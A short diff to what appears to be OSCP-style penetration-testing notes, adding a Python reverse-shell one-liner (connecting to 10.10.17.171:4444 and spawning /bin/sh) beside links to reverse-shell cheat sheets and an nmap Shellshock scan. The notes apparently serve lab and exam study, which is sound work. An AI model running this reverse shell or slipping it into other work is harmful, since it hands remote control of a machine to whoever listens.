@@ -6,6 +6,7 @@
 > - https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html
 > - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 > - https://blog.adithyanak.com/oscp-preparation-guide/windows-reverse-shells
+> - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.171",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ### Shellshock
 > - nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh" 10.10.10.56
